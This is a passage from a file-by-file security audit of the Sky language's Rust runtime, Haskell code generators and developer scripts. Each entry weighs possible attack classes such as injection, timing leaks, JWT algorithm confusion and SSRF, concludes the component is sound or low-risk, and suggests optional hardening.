  - exploit: `n: i64` is guarded `n <= 0` so the `as usize` cast only runs for n>0; positive i64→usize is lossless on 64-bit and `skip` saturates (never panics) on any count. No reachable panic or overflow. Noted only as a defense-in-depth observation that the cast relies on the preceding guard; total as written.
  - fix: None required. If hardened: `skip(n.try_into().unwrap_or(usize::MAX))` to be explicit about the cast bound.

## `runtime-rust/src/sky_runtime/log.rs` — sound
- **low/other** log_emit / log_println — msg is written to stdout/stderr verbatim (lines 93-98, 108)
  - exploit: A Sky-supplied log message containing newlines / control bytes is written unescaped in PLAIN mode, allowing log-line forging in a downstream collector. The message is application-controlled (the app chose to log it), not an external-attacker injection of a SECRET, and JSON mode escapes via json_escape. No secret is logged by this module. Marginal log-injection hygiene only.
  - fix: Optionally sanitize control characters from `msg` before the plain-mode write (strip/escape `\n`/`\r`), matching the JSON path's escaping.

## `tools/sky-ffi-inspect-rs/src/main.rs` — sound
- **low/injection** build_dep_entry / run_rustdoc:259-302 (TOML manifest + cargo invocation)
  - exploit: crate_name / git_url / rev / branch / tag are interpolated into a generated Cargo.toml and passed to `cargo +nightly rustdoc`, which fetches + builds the named crate (running its build.rs). TOML-string breakout is closed by toml_escape (escapes \ " \n \r \t + control chars), and the values are passed to Command::new("cargo").args([...]) as discrete argv entries (no shell), so no shell/arg injection. The build-script execution is the tool's intended function (a developer introspecting a chosen crate), not a network-reachable surface — main() reads only std::env::args(). No attacker path.
  - fix: None required; the toml_escape guard and argv-vector invocation already close the injectable surfaces. (Defense-in-depth: could reject crate names not matching ^[A-Za-z0-9_-]+$ before building, but this is dev-only input.)

## `src/Sky/Generate/Rust/Builder/TypeRenderer.hs` — sound
- **low/codegen** typeToRustString fallback:323 + TVar/TType rendering
  - exploit: This module renders Can.Type values (produced by the Sky type-checker) into Rust type-string fragments for codegen. All inputs are compiler-internal AST nodes, not attacker-controlled runtime data — there is no path from a network request / Sky runtime value into these functions. A malformed render produces a Rust compile error (caught at `cargo build`), not an injectable or exploitable artifact. Type-string fragments are assembled from fixed templates + recursively-rendered known shapes; there is no string interpolation of untrusted bytes. No injection or panic-from-untrusted surface.
  - fix: None required.

## `runtime-rust/src/sky_runtime/live/console.rs` — sound
- **low/timing-oracle** gate_blocked:125-138 (admin Bearer compare)
  - exploit: Already mitigated: the admin-token comparison uses subtle::ConstantTimeEq (`h.as_bytes().ct_eq(expected.as_bytes())`) over the full "Bearer <tok>" string, and ingest_token_blocked likewise uses ct_eq. The length-difference side-channel noted in the comment is benign (reveals only token length class, not content). The auth.denied audit log records only the reason string, never the supplied/expected token, so no secret leaks into the telemetry ring. Production gate (production_from_env) requires the Bearer; dev is intentionally open; SKY_CONSOLE_AUTH=app fails closed with 501; =off returns 404. fold_log / sanitise_ingest strip control chars and cap length, closing the terminal-escape log-injection vector for federated ingest. Ingest fails closed in production when SKY_INGEST_TOKEN is unset.
  - fix: None required; the constant-time compares, fail-closed gates, and ingest sanitisation are all correctly in place.

## `runtime-rust/src/sky_runtime/tui/key.rs` — sound
- **low/panic-untrusted** decode_key / decode_csi / decode_char (whole module)
  - exploit: Input is raw terminal bytes (untrusted, e.g. via bracketed paste). Every buffer access uses .get()/.first() (bounds-checked) or checked slice .get(..n).unwrap_or(&[]); the one arithmetic on a byte, `char::from(b'a' + (b - 1))` at line 52, is gated by the match arm `0x01..=0x1a`, so `b-1` ∈ 0..=25 and `b'a'+x` ∈ 0x61..=0x7a — no overflow, always a valid ASCII letter. decode_char uses from_utf8 + checked prefixes. No indexing, no unwrap on untrusted data, no unbounded loop (every while advances `end` over a finite buf). DoS-free and panic-free.
  - fix: None required.

## `runtime-rust/src/sky_runtime/core.rs` — sound
- **low/panic-untrusted** to_u8_vec / to_u8_array / to_array (FFI byte coercion)
  - exploit: Length-checked conversions return SkyResult::Err on mismatch (never panic/index); to_u8_vec/from_u8_slice use iterator map with `as u8`/`as i64` casts which are total (saturating/truncating, never panic). disconnected_fn* return structured Task errors, not panics. No unwrap/expect/index on Sky-reachable data; serde derives are conditional. Sound.
  - fix: None required.

## `runtime-rust/src/sky_runtime/math.rs` — sound
- **low/panic-untrusted** math_floor/ceil/round/trunc:34-40 (f64 `as i64` cast)
  - exploit: These take an f64 from well-typed Sky (Math.floor etc.). Rust's float-to-int `as` cast is saturating since Rust 1.45 (NaN→0, +inf→i64::MAX, -inf→i64::MIN) — it does NOT panic, even on inf/NaN inputs reachable via math_inf()/math_nan(). math_abs uses checked_abs().unwrap_or(i64::MAX) (i64::MIN-safe). math_mod/math_remainder on y=0.0 yield NaN (IEEE, no panic). math_min/max use PartialOrd comparison (NaN yields a defined branch, no panic). No overflow-panicking integer arithmetic, no unwrap on untrusted input.
  - fix: None required.

## `runtime-rust/src/sky_runtime/live/route.rs` — sound
- **low/panic-untrusted** match_route / match_params:36-82 (URL path matching)
  - exploit: path comes from an attacker-controlled request URL. split_path trims/splits safely; the zip over equal-length segment vecs (guarded by `pat.len() != segs.len()` early return) avoids OOB; `s[1..]` on a `:name` segment is safe because the filter requires `starts_with(':')` so byte index 1 is a valid char boundary (':' is single-byte ASCII). The build closure indexes `p[0]`/`p[1]` in tests, but in production match_routes passes exactly the captured params whose count equals the pattern's `:` count, so codegen-generated constructors receive the right arity (no OOB). No unbounded allocation (params bounded by path segment count). Sound.
  - fix: None required.

## `runtime-rust/scripts/rust-equiv.sh` — sound
- **low/injection** rust-equiv.sh:47-89 (example name `$EX` interpolated into paths and temp filenames)
  - exploit: $EX (CLI arg) is interpolated unquoted into /tmp/equiv-$EX.* filenames and into `D=examples/$EX`. A malicious $EX with shell metachars or `../` could in principle redirect temp writes, but this is a developer-run differential-equivalence harness invoked manually with an example directory name; there is no network/automation feeding untrusted $EX, and the `[ -f "$D/src/Main.sky" ]` guard requires the path to resolve to a real example. `set -uo pipefail` is set. No eval, no `sh -c` with interpolation. The cargo/sky/git invocations use bounded `timeout`. Not an attacker-reachable surface.
  - fix: None required for the threat model; defensively could validate `$EX` against `^[A-Za-z0-9._-]+$` and quote all `$EX` expansions to harden against a path-traversal example name.

## `tools/skydex/src/extract/mod.rs` — sound
- **low/injection** extract_file:18-51 (regex-based symbol/import extraction)
  - exploit: Parses file contents (src) into a local code-index Store via put_edge/put_symbol. `path` and captured import names flow into Store methods only (a code index DB), never into a shell, SQL string-concatenation (skydex uses bound params per its design), or filesystem op. The regexes are static + OnceLock-cached (no ReDoS-prone backtracking on the simple `^import\s+...` / `^\s*source\s+...` patterns). Inputs are repo source files the developer already trusts (they're indexing their own checkout). No attacker-reachable injection or panic (`captures` + `&c[1]` is guarded by the `if let Some(c)` match, and capture group 1 always exists when the regex matches). Sound.
  - fix: None required.

## `runtime-rust/src/sky_runtime/json.rs` — sound
- **low/dos-unbounded** decode_from_json_string:326 / decode_list:143
  - exploit: `serde_json::from_str` on an attacker-supplied JSON body has no depth/size cap at this layer; a deeply-nested array/object could consume stack/heap during parse. serde_json has its own recursion limit (128) that prevents stack overflow, so this is bounded in practice; the runtime adds no extra limit but the dependency caps it.
  - fix: Rely on serde_json's built-in recursion limit (already present). If larger inputs are expected, gate body size at the HTTP layer (already done via maxBodyBytes on the Sky.Live side).

## `runtime-rust/src/sky_runtime/crypto.rs` — sound
- **low/weak-crypto** crypto_md5 / crypto_sha1:61-74
  - exploit: MD5 and SHA-1 are exposed as kernels. They are collision-broken, but the Sky surface offers them as explicit named hashes (parity with Go) for interop/checksums, not as a security primitive, and HMAC/JWT use SHA-256/512. No secret-bearing path is forced through MD5/SHA-1 here.
  - fix: No change required; ensure docs steer auth/MAC use to hmacSha256/JWT (already the default). Optionally annotate md5/sha1 as non-cryptographic in sky doc.

## `runtime-rust/src/sky_runtime/csv.rs` — sound
- **low/other** first_byte:21-23 / csv_parse_with_delimiter:61
  - exploit: A multi-byte UTF-8 delimiter string is truncated to its first byte (`as_bytes().first()`), so a caller-passed delimiter like '€' silently uses byte 0xE2 as the field separator. This is a correctness surprise, not a memory/security defect (no panic — `first().copied().unwrap_or(b',')` is total).
  - fix: Reject non-single-byte delimiters with a Result Err, or document that the delimiter must be a single ASCII byte (the csv crate's delimiter API is u8-only).

## `runtime-rust/src/sky_runtime/live/mod.rs` — sound
- **low/auth-bypass** event_handler:902-919 + sid_from_cookie:1099-1111
  - exploit: Considered: a caller forging the body `sessionId` to act on another session. NOT exploitable — event_handler explicitly ignores `parsed.session_id` (line 908) and authenticates only via the HttpOnly cookie sid (sid_from_cookie), and new_sid() draws 128 bits from OsRng (CSPRNG, line 449-457) so sids are unguessable. CSRF on /_sky/event is enforced by the csrf_middleware layer (line 1073). No bypass found; recorded as the verified primary attack surface.
  - fix: No change needed. Keep `session_id` body field untrusted and the cookie-only auth path.

## `runtime-rust/src/sky_runtime/auth.rs` — sound
- **low/timing-oracle** auth_login:243-260
  - exploit: Considered email-enumeration via timing: mitigated — the unknown-email branch runs an equal-cost bcrypt::verify against a fixed cost-12 dummy hash (line 258). bcrypt::verify itself is constant-time on the digest compare. JWT alg-confusion considered: auth_verify_token pins Validation::new(Algorithm::HS256) (line 145), so `alg:none`/RS-vs-HS confusion is rejected by jsonwebtoken. Secret <32 bytes is refused (lines 106,141). No secret is logged (errors carry only the jwt/bcrypt error category, not the secret/hash). No injectable SQL — all queries use bound params via sqlx .bind. Sound.
  - fix: No change needed.

## `runtime-rust/src/sky_runtime/html.rs` — sound
- **low/other** render_into:145-220 / escape_text:222-231 / Html::HRaw:147
  - exploit: XSS surface reviewed: text + all attribute values route through escape_text/escape_attr covering & < > ' " — no attribute-breakout for either single- or double-quoted attrs. Tag names and attribute KEYS are emitted unescaped, but they originate from Sky stdlib element/attr constructors (compile-time literals), not request data, so an attacker cannot inject a `<`/space into a tag name. HRaw is emitted verbatim by design (documented trusted-content escape hatch) and is only produced by Sky `Html.raw`, an explicit author choice — not reachable from untrusted input without the author opting in. sanitise_sky_id_key strips the sky-id grammar. No reachable injection from untrusted input.
  - fix: No change needed; if defense-in-depth desired, validate tag/attr-key against an allowlist charset before emit.

## `runtime-rust/src/sky_runtime/tui/app.rs` — sound
- **low/panic-untrusted** tui_run:140-149 / tui_app_ui:276-296 decode_key(buf.get(i..n))
  - exploit: Reviewed key/mouse decode from raw stdin bytes (attacker-controlled if stdin is piped). buf.get(i..n) uses checked slicing (returns Option, falls back to &[]); decode_key consumed==0 breaks the loop (no infinite loop / no OOB). focus_idx arithmetic uses (focus_idx + n - 1) % n guarded by n>0; scroll uses saturating_sub/min. No unwrap/index on the byte stream. Terminal state restored via RAII TuiGuard on panic-unwind. Local terminal input is not a network trust boundary. Sound.
  - fix: No change needed.

## `runtime-rust/src/sky_runtime/path.rs` — sound
- **low/path-traversal** path_base/dir/ext/is_absolute:21-87
  - exploit: Pure string/Path-component manipulation — no filesystem operation is performed (no open/read/canonicalize), so these cannot themselves traverse. They could be used by a caller to derive a path, but traversal risk lives at the fs-op call site (File.* kernels), not here. All four are total (no unwrap/index; to_string_lossy is infallible). Sound.
  - fix: No change needed; ensure File.* kernels that consume attacker paths do the containment check.

## `runtime-rust/src/sky_runtime/uuid_kernel.rs` — sound
- **low/weak-crypto** uuid_v4:14-16
  - exploit: If a UUIDv4 from this kernel were used as a security token, uuid::new_v4 is backed by getrandom (OS CSPRNG), so it is unpredictable — acceptable. v7 is time-ordered and NOT secret-safe by design, but that is the documented v7 contract (sortable id, not a token). parse is total (Ok/Nothing). No panic. Sound; flag only as a reminder that v7 must not be used as a bearer secret.
  - fix: No change needed; document that Uuid.v7 is not a secret-grade token (use Crypto.randomToken for secrets).

## `src/Sky/Generate/Rust/Builder/Types.hs` — sound
- **low/other** whole module (UsedKernels / runtimeOpaqueTypes / turbofish maps)
  - exploit: Pure compile-time metadata: feature-gate flags, opaque-type bridge registry, and turbofish/zero-arg name maps. No string is concatenated into emitted Rust from attacker-controlled input here (the maps are static literals; substitution of {M} is over compiler-internal type-var names, not user strings). No subprocess, no injection vector. Sound.
  - fix: No change needed.

## `tools/skydex/src/extract/treesitter.rs` — sound
- **low/panic-untrusted** expand_rust_use:88-89 inner_end<=inner_start guard; extract src[byte_range]:148
  - exploit: Dev-tool over repo source (not a network trust boundary). Reviewed for panics anyway: the reversed-range slice in expand_rust_use is guarded (line 94 bails when inner_end<=inner_start); src[cap.node.byte_range()] uses tree-sitter byte offsets into the same src that produced the tree, which are valid by construction; the two unwrap() on Regex::new are over compile-time-constant patterns (cannot fail at runtime). No panic from realistic input.
  - fix: No change needed.

## `tools/skydex/src/parity.rs` — sound
- **low/other** whole module
  - exploit: Dev-time parity reconciler over Kernel.hs source. Regex unwrap()s are on constant patterns. Indexing c[1]/c[2]/c[3] is on regex capture groups that the pattern guarantees exist (all are non-optional groups), so no OOB. No untrusted input, no injection, no fs/network side effect beyond reading source. Sound.
  - fix: No change needed.

## `runtime-rust/scripts/alloc-stress.sh` — sound
- **low/injection** cleanup:60 pkill -f 'sky-app'; build/run variants
  - exploit: Local benchmark script run by the developer; inputs are env-tunables the operator sets, not external data. Variables are quoted at expansion sites; pkill matches a fixed literal 'sky-app' (the comment explicitly avoids interpolating $CARGO_TARGET_DIR into the regex). No attacker-controlled string reaches a shell/eval. The SERVER_CEILING>LOAD_SECONDS guard fails closed. No injection path for a non-local adversary.
  - fix: No change needed.

## `runtime-rust/src/sky_runtime/server_stream.rs` — sound
- **low/other** serve_streaming_sentinel:167-173 / sentinel_nonce:71-85
  - exploit: Sentinel-forgery reviewed: a relayed/app response body beginning `__sky_stream:<digits>` could otherwise be misread as a streaming control token. Mitigated by a per-process random nonce (128 bits from OS-seeded RandomState) interposed as `__sky_stream:<nonce>:<token>` (line 115/172), so body-controlled content can neither forge nor collide. token parse is .ok()? (no panic), handler lookup is remove()? (Option). StreamId never 0 (loop guard 177-182). Bounded channel (16) gives backpressure. The nonce uses RandomState (a SipHash keyed seed) which is adequate for unguessability of an in-process routing token (not a cross-host secret). Sound.
  - fix: No change needed.

## `runtime-rust/scripts/static-bench.sh` — sound
- **low/injection** build loop / markdown emit:76-126
  - exploit: Local informational benchmark; example names come from on-disk directory basenames under examples/ (the maintainer's tree), not network input. Expansions are quoted; cargo/sky invocations pass fixed flags. No eval, no attacker-controlled interpolation. Sound.
  - fix: No change needed.

## `runtime-rust/src/sky_runtime/ffi_polyfills.rs` — sound
- **low/panic-untrusted** ffi_call_pure_polyfill:28-35 / ffi_call_task_polyfill:51-63 (panic!)
  - exploit: These panic!s are NOT reachable from a well-typed Sky program: the codegen peephole resolves the static-dispatch Ffi.callPure/callTask shape to a direct kernel call, so the polyfill is statically dead for valid Sky (documented + ledger-accepted #3). The panic message includes only the kernel `name` (a compile-time string literal from Sky source), not any secret or request data. No runtime/network path reaches it. Sound.
  - fix: No change needed.

## `runtime-rust/src/sky_runtime/live/console_proxy.rs` — sound
- **low/auth-bypass** proxy_entry / proxy_routes (lines 342-350, 470-478)
  - exploit: proxy_entry forwards every /_sky/console/* request to the spawned child console with NO call to console::gate_blocked, unlike the in-process console path. In isolation this would let an unauthenticated production client reach the full bundled console (logs/metrics/telemetry) via the proxy. HOWEVER this is NOT exploitable: proxy_routes is composed into the same Router that is wrapped by the observability::track layer (mod.rs:1074), and track (observability.rs:87-90) calls console::gate_blocked for any path == /_sky/metrics OR starting with /_sky/console BEFORE the handler runs — so the proxy IS Bearer-admin-token gated in production. gate_allows() additionally refuses to even mount the proxy in production when no SKY_ADMIN_TOKEN/SKY_CONSOLE_TOKEN is set. The auth is enforced by the layer, so the per-handler absence is defense-in-depth, not a hole.
  - fix: No fix required for soundness. Optionally add a redundant gate_blocked check at the top of proxy_entry (defense in depth) so the proxy is self-protecting even if a future refactor moves it outside the track layer. Add a regression test asserting a prod request to /_sky/console/* without a Bearer is 401.
- **low/ssrf** forward (lines 270-316) + ensure_console_proxy (lines 416-463)
  - exploit: The proxy upstream is fixed to http://127.0.0.1:<child_port> where child_port is an OS-assigned ephemeral loopback port (pick_free_port). The request path/query/body are attacker-influenced but only ever appended to a hard-coded loopback origin — no attacker-controlled host/scheme, so no SSRF to arbitrary destinations. Body is bounded to MAX_PROXY_BODY (16 MiB) and 502s rather than buffering unboundedly. Hop-by-hop headers stripped both directions. No panic vectors (every fallible step degrades to 502/503).
  - fix: None needed. The fixed loopback upstream + body cap make this safe.

## `runtime-rust/src/sky_runtime/live/hub_exporter.rs` — sound
- **low/secret-leak** push_one (lines 174-190)
  - exploit: On a push failure the error is logged as eprintln!("[sky.hub] push {url}: {e}"). url = base (SKY_CONSOLE_HUB, an operator-set endpoint, not a secret) + a static path; the bearer token is NOT in url and not in {e} (reqwest::Error redacts auth headers). No token leakage. Token length is enforced >=32 bytes and cleartext http:// is refused unless localhost/127.0.0.1, preventing token-on-wire leak. Spool is bounded (256 batches, oldest evicted) and the offer queue is bounded (1024, drop-on-full) — no unbounded growth from attacker telemetry volume. ns() uses u128 arithmetic so no overflow panic on i64 timestamps.
  - fix: None required.

## `runtime-rust/scripts/examples-sweep.sh` — sound
- **low/injection** build_rust/run_for/equiv_for + RUST_EXAMPLES expansion (lines 350-356, 364-404)
  - exploit: Example names/paths come from on-disk directory listing (build_set) or the developer-set RUST_EXAMPLES env var, never from network/untrusted input. The unquoted `for e in $RUST_EXAMPLES` word-split and the various $n/$d interpolations into cd/timeout/grep are developer-controlled (a malicious example dir name would already imply repo compromise). taskkill//F and pkill are scoped to fixed process names. No attacker-reachable injection path on this CI/dev harness.
  - fix: None required for the threat model. Cosmetic: quote $d/$n in the printf/cd lines for robustness against odd dir names (the keep-go-parity snapshot already handles whitespace via mapfile).

## `runtime-rust/src/sky_runtime/encoding.rs` — sound
- **low/panic-untrusted** form_url_decode (lines 46-75), base64/hex/url decoders
  - exploit: All indexing is total: b.get(i) and s.get(i+1..i+3) return Option and fall through to copying the literal byte; u8::from_str_radix(...).ok() handles non-hex; base64/hex decode errors map to SkyResult::Err / SkyMaybe::Nothing. sky_bytes does `c as u8` (truncating, lossy but total). No panic, no OOB, no unbounded alloc beyond input size. The documented Latin-1/non-UTF-8 divergence from Go is a correctness/interop note, not a security defect.
  - fix: None required.

## `runtime-rust/scripts/keep-go-parity.sh` — sound
- **low/injection** state_set awk / compute_plan git diff (lines 57-63, 84-107)
  - exploit: All inputs are local git state (HEAD shas, example dir names from find) and a developer-set state file. mapfile -t reads dir names safely; sed/awk operate on controlled keys. No untrusted/network input reaches a shell-evaluated context. git rev-parse failures fail closed (exit 2) rather than mis-diffing.
  - fix: None required.

## `runtime-rust/src/sky_runtime/mod.rs` — sound
- **low/other** module wiring (whole file)
  - exploit: This is a pure module-declaration/cfg-gating file (pub mod / pub use behind feature flags). No logic, no input handling, no secrets. The cfg gates correctly scope db/json/crypto/live/server modules. No reachable security defect.
  - fix: None.

## `runtime-rust/scripts/examples-perf-sweep.sh` — sound
- **low/injection** python regression heredoc (lines 133-166) + RUST_PERF expansion (line 79)
  - exploit: The python diff is a `<<'PY'` quoted heredoc — NO shell interpolation into the script body; data arrives only via sys.argv (file paths) and is read with open()/split(\t), never eval'd. Example names come from perf_set (disk) or the developer RUST_PERF env. reap() pkills fixed process names. No attacker-reachable injection.
  - fix: None required.

## `tools/skydex/src/extract/sky.rs` — sound
- **low/dos-unbounded** scan_sky regexes (lines 13-15, 22-27)
  - exploit: The three regexes are simple anchored character-class patterns (no nested quantifiers / catastrophic-backtracking shape), compiled once via OnceLock and run line-by-line over local source files (a code indexer, not a network service). Input is the repo's own .sky files. captures()[1] indexing is safe because a successful capture guarantees group 1. No ReDoS, no panic, no untrusted input.
  - fix: None required.

## `tools/skydex/src/pipeline.rs` — sound
- **low/other** record_stage (lines 7-12)
  - exploit: Thin wrapper: maps a local file path to a compiler-stage edge via stage_of and writes to the SQLite store, returning Result (no unwrap on the hot path; tests use unwrap which is test-only). Input is repo file paths from the indexer walk, not untrusted. put_edge is parameterised by the store layer. No injection / panic / secret exposure reachable.
  - fix: None required.

## `runtime-rust/src/sky_runtime/decimal.rs` — sound
- **low/panic-untrusted** decimal_to_string()/decimal_format_with()/round_dp_with_strategy paths
  - exploit: No reachable panic found: fromMinor/toMinor/format clamp places to MAX_SCALE and use checked_pow/checked_mul with saturation; add/sub/mul use checked_* with signed-extreme saturation; div/mod guard zero. The previously panic-prone rust_decimal operator overloads are all routed through checked variants. Caller-controlled i64 scale/places are clamped before any pow/format. No defect — listed as the explicit not-broken conclusion.
  - fix: None required.

## `runtime-rust/src/sky_runtime/telemetry_spill.rs` — sound
- **low/injection** pruner() telemetry_spill.rs:191 format!("DELETE FROM {table} WHERE time < ?") and write_entry INSERTs
  - exploit: No injection: `table` iterates a hardcoded literal array ["telemetry_log","telemetry_span"], never attacker input; all value columns (service_name, level, message, span name, attrs) are bound via .bind(), not string-interpolated. service_name comes from SKY_SERVICE_NAME env (operator). The attrs JSON for spans is a fixed literal (ok|error). offer_* are non-blocking try_send (drop on full, never panic). Sound.
  - fix: None required.

## `runtime-rust/src/sky_runtime/system.rs` — sound
- **low/race-toctou** locked_set_var/locked_remove_var:15-24 + system_load_env:205 — process-global ENV_MUTATION_LOCK guards std::env::set_var/remove_var
  - exploit: std::env::set_var/remove_var are documented as not-thread-safe; the mutation lock serialises mutator↔mutator but, as the module comment itself states, a concurrent READER on another thread (any third-party code calling getenv, or libc) is still unsynchronised against a mutating Task. Under Task.parallel composing System.setenv with other env-reading work this is technically UB per the std contract. Triggering it requires the Sky program to deliberately mutate env concurrently with reads — not an external attacker path — and matches Go's os.Setenv (mutex among Go callers only), so it is bounded and parity-consistent. Process.run correctly avoids shell injection (Command::new + args, no `sh -c`).
  - fix: No clean in-boundary fix while std exposes the racy API; the lock is the right mitigation for the reachable (mutator-mutator) case. Document that System.setenv/unsetenv must not run concurrently with env reads under Task.parallel, and consider an app-level convention of mutating env only at startup (single-threaded) — matching the Go guidance.

## `src/Sky/Generate/Rust/Builder/Kernel.hs` — sound
- **low/injection** kernelToRust default arm:800-802 (snake-case of module++name)
  - exploit: The default arm builds a Rust function identifier from the Sky module + name by replacing '.' with '_' and snake-casing. If an attacker could inject arbitrary characters into a module/function name they could in principle emit arbitrary Rust tokens. In practice this is NOT reachable: the names originate from canonicalised Sky identifiers, whose grammar restricts them to [A-Za-z0-9_] plus dotted module segments — no whitespace, braces, or operator characters survive to this point, and snake-casing only inserts underscores. A wrong name yields at worst an E0425 (undefined function) at cargo time, caught by the build, not injectable code.
  - fix: No change required. If ever the identifier source is loosened, add an assertion that the routed name matches `^[a-z0-9_]+$` before emission.

## `runtime-rust/src/sky_runtime/live/store.rs` — sound
- **low/injection** SqliteStore/PostgresStore get/set/delete (all sqlx::query sites, e.g. :143, :155, :164)
  - exploit: All SQL uses parameter binding (`.bind(sid)`, `.bind(blob)`); the session id and serialized model never enter the query string. The CREATE TABLE statements are static literals. No string-built SQL, so no injection even though `sid` ultimately derives from an attacker-controlled cookie. The sid itself is a 128-bit OS-CSPRNG value (new_sid in live/mod.rs), so it is unguessable; store.rs does not weaken that. Listed only to document that the cookie->sid->SQL path was checked and is parameterized end to end.
  - fix: None needed.

## `runtime-rust/src/sky_runtime/webview.rs` — sound
- **low/injection** imp::webview_app:275 `format!("window.__skyApply({})", json_str(&nbody))`
  - exploit: Re-render injects the new body into a JS call. The body is JSON-string-escaped via serde (`json_str`) before interpolation, and `render_html` HTML-escapes all text/attribute nodes, so neither the JS-string boundary nor the innerHTML boundary is an injection sink for model/event data. The only residual risk is if a future raw-HTML node is added to the renderer (the code comment flags exactly this). No current vector; desktop in-process bridge with no network surface.
  - fix: None needed now; keep the renderer's escaping invariant and audit any raw-HTML node added later.

## `src/Sky/Build/Rust/Console.hs` — sound
- **low/injection** buildConsole:193-195 `proc skyBin ["build","src/Main.sky","--target","rust"]` + readCreateProcessWithExitCode
  - exploit: The recursive build spawns the sky binary via `proc` (argv vector, no shell), with fixed literal arguments; `buildDir`/`skyBin` derive from $HOME and getExecutablePath, not from any network/Sky-source input. childEnv is the parent env minus CARGO_TARGET_DIR plus the recursion guard. No attacker-controlled value reaches the command line or a shell, so no shell/arg injection. Whole flow is best-effort and non-fatal.
  - fix: None needed.

## `runtime-rust/src/sky_runtime/jwt.rs` — sound
- **low/weak-crypto** jwt_decode_hs256:25 / jwt_decode_rs256:63 (Validation construction)
  - exploit: Algorithm-confusion is correctly prevented: `Validation::new(Algorithm::HS256)` / `RS256` pins the accepted-algorithm set to the single chosen alg, so an attacker cannot submit an RS256-signed-as-HS256 token to the HS256 verifier or vice-versa. exp and nbf are required+validated. The decoders do NOT enforce `aud`/`iss`, but these are generic `Sky.Core.Jwt` primitives where claim policy is the caller's responsibility (Go-parity), and the missing aud check is not a bypass of the signature/exp/nbf gate. Error strings carry the jsonwebtoken error message, not the secret/key material.
  - fix: No change required for the primitive. Document that callers needing audience/issuer pinning must check the returned claims, or expose a builder that sets `validation.set_audience(...)`.
- **low/secret-leak** jwt_encode_rs256:49 / jwt_decode_rs256:61 (`format!("...: key: {}", e)`)
  - exploit: On a malformed RSA PEM the jsonwebtoken key-parse error `e` is folded into the returned Sky error string. The error describes the parse failure (e.g. invalid PEM structure) and does not echo the private-key bytes, so this is not a key disclosure; worst case it confirms the key was malformed. Bounded.
  - fix: Optional: replace key-parse error detail with a fixed "invalid RSA key" message to avoid surfacing any structural hint about the key material.

## Sound, no findings (46)
`CrateSpecs.hs`, `Naming.hs`, `Project.hs`, `SigRegistry.hs`, `TypeEmitter.hs`, `Walker.hs`, `cache.rs`, `cell.rs`, `checks.sh`, `config_decode.rs`, `coverage.rs`, `dict.rs`, `diff.rs`, `diff.rs`, `dispatch.rs`, `element.rs`, `env.sh`, `examples.sh`, `examples_test.sh`, `ffi_audit.py`, `focus.rs`, `hub_exporter.rs (duplicate guard)`, `io.rs`, `keep_go_parity_test.sh`, `layout.rs`, `lib.rs`, `main.rs`, `mod.rs`, `mod.rs`, `model.rs`, `pubsub.rs`, `push.sh`, `quality-audit.sh`, `query.rs`, `readme-tables.py`, `regex_kernel.rs`, `set.rs`, `sse.rs`, `string.rs`, `stringify.rs`, `task.rs`, `tea.rs`, `telemetry.rs`, `trace.rs`, `verify-rust-target.sh`, `walk.rs`
